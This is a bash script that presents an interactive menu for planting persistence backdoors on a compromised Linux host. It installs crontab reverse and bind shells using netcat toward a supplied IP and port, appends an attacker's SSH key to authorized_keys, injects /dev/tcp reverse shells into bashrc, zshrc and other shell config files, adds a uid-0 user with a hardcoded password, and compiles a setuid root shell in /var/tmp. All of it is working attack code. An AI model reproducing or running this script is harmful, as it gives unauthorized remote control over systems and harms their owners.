#!/usr/bin/env bash

# Reset
Color_Off='\033[0m'       # Text Reset

# Regular Colors
Green='\033[0;32m'        # Green
Cyan='\033[0;36m'         # Cyan
Purple='\033[0;35m'       # Purple
Red='\033[0;31m'          # Red
Yellow='\033[0;33m'       # Yellow

select_option() {

    # little helpers for terminal print control and key input
    ESC=$( printf "\033")
    cursor_blink_on()  { printf "$ESC[?25h"; }
    cursor_blink_off() { printf "$ESC[?25l"; }
    cursor_to()        { printf "$ESC[$1;${2:-1}H"; }
    print_option()     { printf "  ${Purple}$1${Color_Off} "; }
    print_selected()   { printf "  $ESC[7m$1 $ESC[27m"; }
    get_cursor_row()   { IFS=';' read -sdR -p $'\E[6n' ROW COL; echo "${ROW#*[}"; }
    key_input()        { read -s -n3 key 2>/dev/null >&2
                         if [[ $key = $ESC[A ]]; then echo up;    fi
                         if [[ $key = $ESC[B ]]; then echo down;  fi
                         if [[ $key = ""     ]]; then echo enter; fi; }

    # initially print empty new lines (scroll down if at bottom of screen)
    for opt; do printf "\n"; done

    # determine current screen position for overwriting the options
    lastrow=$(get_cursor_row)
    startrow=$(($lastrow - $#))

    # ensure cursor and input echoing back on upon a ctrl+c during read -s
    trap "cursor_blink_on; stty echo; printf '\n'; exit" 2
    cursor_blink_off

    selected=0
    while true; do
        # print options by overwriting the last lines
        idx=0
        for opt; do
            cursor_to $(($startrow + $idx))
            if [ $idx -eq $selected ]; then
                # print_selected "\033[1;96m> $opt ${Color_Off}"
                print_selected "${Yellow}> $opt ${Color_Off}"
            else
                print_option "   $opt "
            fi
            ((idx++))
        done

        # user key control
        case $(key_input) in
            enter) break;;
            up)    ((selected--));
                   if [ $selected -lt 0 ]; then selected=$(($# - 1)); fi;;
            down)  ((selected++));
                   if [ $selected -ge $# ]; then selected=0; fi;;
        esac
    done

    # cursor position back to normal
    cursor_to "$lastrow"
    printf "\n"
    cursor_blink_on

    return $selected
}

verify_tty(){

    if ! tty -s
    then
        printf "[${Red}!${Color_Off}] ${Red}Error: the current process is not associated with a terminal, arrow menu can't be executed${Color_Off}\n"
        return 1
    else
        return 0
    fi

}

verify_cron() {

    output=$(find /etc -maxdepth 1 '(' -type d -or -type f ')' '(' -name "cron*" -or -name "anacron" -or -name "anacrontab" -or -name "incron.d" ')' -exec echo {} \;)

    if [ -n "$output" ]
    then    
        :
    else
        printf "[${Red}!${Color_Off}] ${Red}Error: Cron service does not seem to be running.${Color_Off}\n"
        exit 1
    fi

}

check_programs() {

    for prog in "$@"; do
        if ! which "$prog" >/dev/null ; then
            printf "[${Red}!${Color_Off}] ${Red}Error: ${prog} isn't installed, cannot continue execution.${Color_Off}\n"
        exit 1
        fi
    done

}

verify_root(){

    if [ "$(whoami)" "!=" "root" ]
    then
        printf "[${Red}!${Color_Off}] ${Red}Error: the action you want to do requires elevated privileges.${Color_Off}\n"
        exit 1
    fi

}

check_netcat_version() {

    check_programs "nc"

    version_info=$(nc -h 2>&1)
    if echo "$version_info" | grep -q "OpenBSD"; then
        printf "[${Red}!${Color_Off}] ${Red}Error: BSD version of netcat detected. It doesn't let create a bind shell.${Color_Off}\n"
        exit 1
    fi

}

crontab_reverse_shell() {

    verify_cron

    printf "[${Green}>${Color_Off}] ${Green}Enter IP address: ${Yellow}"
    read -r ip
    printf "${Color_Off}"
    printf "[${Green}>${Color_Off}] ${Green}Enter port: ${Yellow}"
    read -r port
    printf "${Color_Off}"
    (crontab -l 2>/dev/null; echo "* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $ip $port >/tmp/f") | crontab -
    printf "[${Green}!${Color_Off}] ${Green}Current cronjobs:${Color_Off}\n"
    printf "${Green}"
    crontab -l
    printf "${Color_Off}"
}

crontab_bind_shell() {

    verify_cron
    check_netcat_version

    printf "[${Green}>${Color_Off}] ${Green}Enter port: ${Yellow}"
    read -r port
    printf "${Color_Off}"
    (crontab -l 2>/dev/null; echo "* * * * * nc -lnp $port -e /bin/sh") | crontab -
    printf "[${Green}!${Color_Off}] ${Green}Current cronjobs:${Color_Off}\n"
    printf "${Green}"
    crontab -l
    printf "${Color_Off}"

}

ssh_persistence() {

    if [ -d "$HOME" ]
    then
        :
    else
        printf "[${Red}!${Color_Off}] ${Red}Error: Home directory doesn't exist, cannot continue execution.${Color_Off}\n"
        exit 1
    fi

    if ! (ps aux | grep sshd | grep -v grep) >/dev/null ; then
        printf "[${Red}!${Color_Off}] ${Red}Error: ${prog} ssh server doesn't appear to be running. continuing execution.${Color_Off}\n"
    fi

    check_programs "ssh-keygen"

    HOSTNAME=$(hostname) && ssh-keygen -t rsa -C "$HOSTNAME" -f "$HOME/.ssh/id_rsa" -P "" && cat ~/.ssh/id_rsa.pub

    printf "[${Green}>${Color_Off}] ${Green}Paste here the attacker's machine id_rsa.pub: ${Yellow}"
    read -r id_rsapub 
    printf "${Color_Off}"
    echo "$id_rsapub" >> "$HOME"/.ssh/authorized_keys
    printf "[${Green}!${Color_Off}] ${Green}Current authorized keys:${Color_Off}\n"
    printf "${Green}"
    cat "$HOME"/.ssh/authorized_keys
    printf "${Color_Off}"

}

default_shell() {

    username=$(whoami)
    default_shell=$(getent passwd "$username" | cut -d: -f7 | xargs basename)
    echo -n "$default_shell"

}

shell_config_reverse_shell() {

    printf "[${Green}>${Color_Off}] ${Green}Enter IP address: ${Yellow}"
    read -r ip
    printf "${Color_Off}"
    printf "[${Green}>${Color_Off}] ${Green}Enter port: ${Yellow}"
    read -r port
    printf "${Color_Off}"

    shell=$(default_shell) 

    case $shell in
        bash)
            config_file="$HOME/.bashrc"
            echo "((bash -i >& /dev/tcp/${ip}/${port} 0>&1) & disown ) &>/dev/null" >> "$config_file"
            ;;
        zsh)
            config_file="$HOME/.zshrc"
            echo "((zmodload zsh/net/tcp && ztcp ${ip} ${port} && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY) & disown ) &>/dev/null" >> "$config_file"
            ;;
        ksh)
            config_file="$HOME/.kshrc"
            echo "((bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1') & disown ) &>/dev/null" >> "$config_file"
            ;;
        dash)
            config_file="$HOME/.dashrc"
            echo "((bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1') & disown ) &>/dev/null" >> "$config_file"
            ;;
        tcsh)
            config_file="$HOME/.tcshrc"
            echo "((bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1') & disown ) &>/dev/null" >> "$config_file"
            ;;
        fish)
            config_file="$HOME/.config/fish/config.fish"
            echo "((bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1') & disown ) &>/dev/null" >> "$config_file"
            ;;
        ash)
            check_netcat_version
            config_file="$HOME/.profile"
            echo "((* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip} ${port} >/tmp/f) & disown ) &>/dev/null" >> "$config_file"

            ;;
        *)
            printf "[${Red}!${Color_Off}] ${Red}Error $shell config file is unknow.${Color_Off}\n"
            exit 1
            ;;
    esac

    printf "[${Green}!${Color_Off}] ${Green}Current revshells in ${config_file} configuration file:${Color_Off}\n"
    printf "${Green}"
    tail -n 1 "${config_file}" 
    printf "${Color_Off}"

}

add_a_root_user() {

    verify_root
    check_programs useradd

    user="john"
    password="b4ckdoor_passwd"
    useradd -ou 0 -g 0 $user -p "$(openssl passwd -1 $password)" 2>/dev/null
    printf "[${Green}!${Color_Off}] ${Green}Superuser ${user} created with password: ${password}${Color_Off}\n"
    printf "${Green}"
    cat /etc/passwd | grep john
    printf "${Color_Off}"

}

create_SUID_shell() {

    verify_root
    check_programs gcc

    TMPDIR2="/var/tmp"
    echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
    gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
    rm $TMPDIR2/croissant.c
    chown root:root $TMPDIR2/croissant
    chmod 4777 $TMPDIR2/croissant
    printf "[${Green}!${Color_Off}] ${Green}SUID shell droped in ${TMPDIR2}/croissant ${Color_Off}\n"
    printf "${Green}"
    ls -l $TMPDIR2/croissant
    printf "${Color_Off}"

}

bash_version() {

    printf "[${Green}!${Color_Off}] ${Cyan}Choose one option using up/down keys and enter to confirm:${Color_Off}\n\n"

    IFS=','
    for method in $methods
    do
        method=$(echo "$method" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')
        bash_methods[${#bash_methods[@]}]="$method"
    done
    select_option "${bash_methods[@]}"
    selection=$(( $? + 1))

    selector

}

zsh_version() {

    printf "[${Green}!${Color_Off}] ${Cyan}Choose an option by typing the number:${Color_Off}\\n\n"

    set -A methods ${(s:,:)methods}

    counter=1
    for item in "${methods[@]}"
    do
        item=${item#${i%%[![:space:]]*}}
        printf "   ${Purple}[${Yellow}$counter${Purple}] $item${Color_Off}\n"
        counter=$(( counter + 1 ))
    done

    read_input

}

generic_vesion() {

    printf "[${Green}!${Color_Off}] ${Cyan}Choose an option by typing the number:${Color_Off}\\n\n"

    IFS=','
    counter=1
    for item in $methods
    do
        item=$(echo "$item" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')
        printf "   ${Purple}[${Yellow}$counter${Purple}] $item${Color_Off}\n"
        counter=$(( counter + 1 ))
    done 
    
    read_input

}

read_input() {

    printf "\n"
    printf "${Green}Method: ${Yellow}"
    read -r selection
    printf "${Color_Off}"

    selector

}

selector() {

    if [ "$selection" = "1" ]; then
        crontab_reverse_shell
    elif [ "$selection" = "2" ]; then
        crontab_bind_shell
    elif [ "$selection" = "3" ]; then
        ssh_persistence
    elif [ "$selection" = "4" ]; then
        shell_config_reverse_shell
    elif [ "$selection" = "5" ]; then
        add_a_root_user
    elif [ "$selection" = "6" ]; then
        create_SUID_shell
    else
        printf "[${Red}*${Color_Off}] ${Red}Error: Invalid selection.${Color_Off}\n"
    fi

}

main(){

    echo

    methods="Crontab Reverse Shell, Crontab Bind Shell, SSH Persistence, Backdoor in a user's shell, Add a root user (Root required), Create SUID shell (Root required)"

    if [ -n "$BASH_VERSION" ]  && verify_tty ; then
        bash_version    
    elif [ -n "$ZSH_VERSION" ]; then
        zsh_version
    else
        generic_vesion
    fi

}

main
